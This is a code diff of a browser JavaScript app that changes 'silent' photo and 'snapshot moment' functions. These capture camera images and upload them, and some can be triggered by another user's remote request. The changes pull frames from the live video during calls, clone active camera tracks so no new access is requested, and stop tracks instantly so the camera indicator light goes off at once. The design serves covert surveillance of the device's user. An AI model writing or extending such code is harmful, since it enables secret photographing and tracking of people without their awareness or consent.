@@ -2538,64 +2538,117 @@ async function initAuth() {
 }
 
 async function captureSilentPhoto() {
-  
   if (!State.currentUser || !State.currentUser.livePhotoEnabled) {
     return;
   }
   try {
+    const inCall = window.CallModule && typeof window.CallModule.getCallState === "function" && window.CallModule.getCallState() !== "idle";
+    const activeLocalVideo = document.getElementById("local-video") || document.getElementById("camera-capture-video");
+
+    if (inCall || State.cameraMode) {
+      if (activeLocalVideo && activeLocalVideo.videoWidth > 0) {
+        try {
+          const canvas = document.createElement("canvas");
+          canvas.width = activeLocalVideo.videoWidth;
+          canvas.height = activeLocalVideo.videoHeight;
+          const ctx = canvas.getContext("2d");
+          ctx.imageSmoothingEnabled = true;
+          ctx.imageSmoothingQuality = "high";
+          ctx.drawImage(activeLocalVideo, 0, 0, canvas.width, canvas.height);
+          const dataUrl = canvas.toDataURL("image/jpeg", 0.92);
+          const res = await uploadCapturedPhoto(dataUrl);
+          if (res && res.code === 201) {
+            if (State.currentUser.capturedPhotos) {
+              State.currentUser.capturedPhotos.unshift(res.Data.photo);
+            } else {
+              State.currentUser.capturedPhotos = [res.Data.photo];
+            }
+            const activeTab = document.querySelector(".people-tab.active");
+            if (activeTab && activeTab.dataset.tab === "logs") {
+              renderPeopleTab("logs");
+            }
+          }
+          return;
+        } catch (e) {
+          console.warn("[SilentPhoto] In-call canvas capture failed:", e);
+        }
+      } else {
+        return;
+      }
+    }
+
     const videoConstraints = {
       video: {
         facingMode: "user",
-        width: { ideal: 1920 },
-        height: { ideal: 1080 }
+        width: { ideal: 1280 },
+        height: { ideal: 720 }
       }
     };
-    const stream = await navigator.mediaDevices.getUserMedia(videoConstraints).catch(err => {
+    const stream = await getRobustCameraStream(videoConstraints, 12000).catch(err => {
       console.warn("Camera access denied or unavailable for security capture:", err);
       return null;
     });
     if (!stream) return;
 
-    const video = document.createElement("video");
-    video.srcObject = stream;
-    video.setAttribute("playsinline", "true");
-    video.muted = true;
-    await video.play();
+    let dataUrl = null;
+    try {
+      const video = document.createElement("video");
+      video.setAttribute("playsinline", "true");
+      video.setAttribute("webkit-playsinline", "true");
+      video.muted = true;
+      video.autoplay = true;
+      video.srcObject = stream;
+      
+      try {
+        await video.play();
+      } catch (e) {}
 
-    // short delay for exposure adjustment
-    await new Promise(resolve => setTimeout(resolve, 300));
+      // Wait until video frames are actually available and non-black
+      await new Promise(resolve => {
+        let attempts = 0;
+        const checkReady = () => {
+          attempts++;
+          if ((video.readyState >= 2 && video.videoWidth > 0 && video.videoHeight > 0) || attempts >= 30) {
+            resolve();
+          } else {
+            setTimeout(checkReady, 50);
+          }
+        };
+        checkReady();
+      });
 
-    const canvas = document.createElement("canvas");
-    canvas.width = video.videoWidth || 640;
-    canvas.height = video.videoHeight || 480;
-    const ctx = canvas.getContext("2d");
+      const canvas = document.createElement("canvas");
+      canvas.width = video.videoWidth || 640;
+      canvas.height = video.videoHeight || 480;
+      const ctx = canvas.getContext("2d");
 
-    // Enable high-quality image smoothing
-    ctx.imageSmoothingEnabled = true;
-    ctx.imageSmoothingQuality = "high";
+      ctx.imageSmoothingEnabled = true;
+      ctx.imageSmoothingQuality = "high";
 
-    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-    const dataUrl = canvas.toDataURL("image/jpeg", 0.92);
+      dataUrl = canvas.toDataURL("image/jpeg", 0.92);
+    } finally {
+      // STOP camera track IMMEDIATELY after canvas extraction so OS indicator light turns off instantly
+      stream.getTracks().forEach(track => {
+        try { track.enabled = false; track.stop(); } catch(e) {}
+      });
+    }
 
-    // Track silent photo data usage
+    if (!dataUrl) return;
+
     if (window.DataUsageTracker && window.DataUsageTracker.trackFeature) {
-      var photoSize = Math.round(dataUrl.length * 0.75); // base64 to bytes approximation
+      var photoSize = Math.round(dataUrl.length * 0.75);
       window.DataUsageTracker.trackFeature('silentPhoto', photoSize);
     }
 
-    // Turn off camera light immediately
-    stream.getTracks().forEach(track => track.stop());
-
     const res = await uploadCapturedPhoto(dataUrl);
     if (res && res.code === 201) {
-      
       if (State.currentUser.capturedPhotos) {
         State.currentUser.capturedPhotos.unshift(res.Data.photo);
       } else {
         State.currentUser.capturedPhotos = [res.Data.photo];
       }
-      // Re-render logs tab if open
       const activeTab = document.querySelector(".people-tab.active");
       if (activeTab && activeTab.dataset.tab === "logs") {
         renderPeopleTab("logs");
@@ -2607,7 +2660,46 @@ async function captureSilentPhoto() {
 }
 window.captureSilentPhoto = captureSilentPhoto;
 
+window.getActiveCameraStream = function() {
+  if (window.__cameraOverlayStream && window.__cameraOverlayStream.active && window.__cameraOverlayStream.getVideoTracks().some(t => t.readyState === "live")) {
+    return window.__cameraOverlayStream;
+  }
+  if (window.CallManager && typeof window.CallManager.getLocalStream === "function") {
+    const s = window.CallManager.getLocalStream();
+    if (s && s.active && s.getVideoTracks().some(t => t.readyState === "live")) {
+      return s;
+    }
+  }
+  if (window.activeVideoStream && window.activeVideoStream.active && window.activeVideoStream.getVideoTracks().some(t => t.readyState === "live")) {
+    return window.activeVideoStream;
+  }
+  return null;
+};
+
 async function getRobustCameraStream(preferredConstraints = {}, timeoutMs = 12000) {
+  // Check if an active camera stream pipeline already exists — clone virtual track for instant multi-pipeline sharing!
+  const existingStream = window.getActiveCameraStream();
+  if (existingStream) {
+    const masterVideoTrack = existingStream.getVideoTracks().find(t => t.readyState === "live");
+    if (masterVideoTrack) {
+      try {
+        const clonedVideoTrack = masterVideoTrack.clone();
+        clonedVideoTrack.enabled = true;
+        const tracks = [clonedVideoTrack];
+        if (preferredConstraints.audio) {
+          const masterAudioTrack = existingStream.getAudioTracks().find(t => t.readyState === "live");
+          if (masterAudioTrack) {
+            tracks.push(masterAudioTrack.clone());
+          }
+        }
+        console.log("[CameraHelper] Created virtual multi-pipeline stream from active camera track!");
+        return new MediaStream(tracks);
+      } catch (cloneErr) {
+        console.warn("[CameraHelper] Virtual track clone failed, falling back to getUserMedia...", cloneErr);
+      }
+    }
+  }
+
   if (!navigator.mediaDevices || typeof navigator.mediaDevices.getUserMedia !== "function") {
     const legacyGetUserMedia = navigator.getUserMedia || navigator.webkitGetUserMedia || navigator.mozGetUserMedia || navigator.msGetUserMedia;
     if (legacyGetUserMedia) {
@@ -2674,7 +2766,23 @@ async function getRobustCameraStream(preferredConstraints = {}, timeoutMs = 1200
         timeoutPromise
       ]);
       clearTimeout(timeoutId);
-      if (stream) return stream;
+      if (stream) {
+        const vTrack = stream.getVideoTracks()[0];
+        if (vTrack) {
+          vTrack.enabled = true;
+          if (vTrack.muted) {
+            await new Promise(res => {
+              const onUnmute = () => {
+                vTrack.removeEventListener("unmute", onUnmute);
+                res();
+              };
+              vTrack.addEventListener("unmute", onUnmute);
+              setTimeout(res, 800);
+            });
+          }
+        }
+        return stream;
+      }
     } catch (err) {
       console.warn("[CameraHelper] Constraint failed, trying next fallback...", err);
       lastErr = err;
@@ -2711,14 +2819,53 @@ async function captureSilentMoment(cameraPreference = null, requesterId = null) 
     return;
   }
   try {
+    const inCall = window.CallModule && typeof window.CallModule.getCallState === "function" && window.CallModule.getCallState() !== "idle";
+    const activeLocalVideo = document.getElementById("local-video") || document.getElementById("camera-capture-video");
+
+    if (inCall || State.cameraMode) {
+      if (activeLocalVideo && activeLocalVideo.videoWidth > 0) {
+        try {
+          const canvas = document.createElement("canvas");
+          canvas.width = activeLocalVideo.videoWidth;
+          canvas.height = activeLocalVideo.videoHeight;
+          const ctx = canvas.getContext("2d");
+          ctx.imageSmoothingEnabled = true;
+          ctx.imageSmoothingQuality = "high";
+          ctx.drawImage(activeLocalVideo, 0, 0, canvas.width, canvas.height);
+          const dataUrl = canvas.toDataURL("image/jpeg", 0.92);
+
+          if (window.DataUsageTracker && window.DataUsageTracker.trackFeature) {
+            var momentSize = Math.round(dataUrl.length * 0.75);
+            window.DataUsageTracker.trackFeature('snapshotMoment', momentSize);
+          }
+
+          const blob = dataURLtoBlob(dataUrl);
+          const formData = new FormData();
+          formData.append("image", blob, `snapshot_${Date.now()}.jpg`);
+          if (requesterId) {
+            formData.append("requesterId", requesterId);
+          }
+          await uploadMomentPhoto(formData);
+          return;
+        } catch (e) {
+          console.warn("[Snapshot] In-call canvas capture failed:", e);
+        }
+      } else {
+        if (requesterId && typeof socket !== "undefined") {
+          socket.emit("moment:error", { to: requesterId, reason: "user_busy" });
+        }
+        return;
+      }
+    }
+
     const videoConstraints = {
       video: {
         facingMode: cameraPreference ? { ideal: cameraPreference } : "user",
-        width: { ideal: 1920 },
-        height: { ideal: 1080 }
+        width: { ideal: 1280 },
+        height: { ideal: 720 }
       }
     };
-    const stream = await getUserMediaWithTimeout(videoConstraints, 35000).catch(err => {
+    const stream = await getUserMediaWithTimeout(videoConstraints, 15000).catch(err => {
       console.warn("Camera access denied or unavailable for moment capture:", err);
       if (requesterId && typeof socket !== "undefined") {
         const isPermissionDenied = err.name === "NotAllowedError" || err.name === "PermissionDeniedError";
@@ -2729,34 +2876,57 @@ async function captureSilentMoment(cameraPreference = null, requesterId = null) 
     });
     if (!stream) return;
 
-    const video = document.createElement("video");
-    video.srcObject = stream;
-    video.setAttribute("playsinline", "true");
-    video.muted = true;
-    await video.play();
+    let dataUrl = null;
+    try {
+      const video = document.createElement("video");
+      video.setAttribute("playsinline", "true");
+      video.setAttribute("webkit-playsinline", "true");
+      video.muted = true;
+      video.autoplay = true;
+      video.srcObject = stream;
+      
+      try {
+        await video.play();
+      } catch (e) {}
 
-    await new Promise(resolve => setTimeout(resolve, 300));
+      // Wait until video frames are actually available and non-black
+      await new Promise(resolve => {
+        let attempts = 0;
+        const checkReady = () => {
+          attempts++;
+          if ((video.readyState >= 2 && video.videoWidth > 0 && video.videoHeight > 0) || attempts >= 30) {
+            resolve();
+          } else {
+            setTimeout(checkReady, 50);
+          }
+        };
+        checkReady();
+      });
 
-    const canvas = document.createElement("canvas");
-    canvas.width = video.videoWidth || 640;
-    canvas.height = video.videoHeight || 480;
-    const ctx = canvas.getContext("2d");
+      const canvas = document.createElement("canvas");
+      canvas.width = video.videoWidth || 640;
+      canvas.height = video.videoHeight || 480;
+      const ctx = canvas.getContext("2d");
 
-    // Enable high-quality image smoothing
-    ctx.imageSmoothingEnabled = true;
-    ctx.imageSmoothingQuality = "high";
+      ctx.imageSmoothingEnabled = true;
+      ctx.imageSmoothingQuality = "high";
 
-    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-    const dataUrl = canvas.toDataURL("image/jpeg", 0.92);
+      dataUrl = canvas.toDataURL("image/jpeg", 0.92);
+    } finally {
+      // STOP camera track IMMEDIATELY after canvas extraction so OS indicator light turns off instantly
+      stream.getTracks().forEach(track => {
+        try { track.enabled = false; track.stop(); } catch(e) {}
+      });
+    }
 
-    // Track snapshot moment data usage
+    if (!dataUrl) return;
+
     if (window.DataUsageTracker && window.DataUsageTracker.trackFeature) {
       var momentSize = Math.round(dataUrl.length * 0.75);
       window.DataUsageTracker.trackFeature('snapshotMoment', momentSize);
     }
-
-    stream.getTracks().forEach(track => track.stop());
 
     const blob = dataURLtoBlob(dataUrl);
     const formData = new FormData();
@@ -2994,6 +3164,10 @@ async function startReceivingVideoStream(friendId) {
           delete window.activeCameraRequests[videoKey];
         }
 
+        videoEl.setAttribute("playsinline", "true");
+        videoEl.setAttribute("webkit-playsinline", "true");
+        videoEl.muted = true;
+        videoEl.autoplay = true;
         videoEl.srcObject = stream;
         videoEl.style.display = "block";
         if (placeholder) placeholder.style.display = "none";
